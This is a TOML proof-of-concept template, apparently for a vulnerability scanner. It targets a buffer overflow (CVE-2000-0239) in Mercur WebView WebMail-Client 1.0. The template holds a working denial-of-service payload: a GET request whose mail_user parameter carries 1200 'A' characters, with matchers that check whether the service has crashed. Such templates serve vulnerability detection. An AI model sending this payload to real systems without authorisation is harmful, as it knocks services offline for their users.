[info]
author = "ave"
description = "通过向 Mercur WebView WebMail-Client 端口 1080 发送包含超长 mail_user 参数的 GET 请求触发缓冲区溢出，导致服务崩溃拒绝服务"
id = "POC-AVE-2000-0217"
name = "Atrium Software Mercur WebView WebMail-Client 1.0 Buffer Overflow PoC"
severity = "medium"
tags = ["ave-2000-0217"]
vuln_id = [
    "CVE-2000-0239",
    "AVE-2000-0217",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/&mail_user={{repeat('A', 1200)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "connection refused",
]
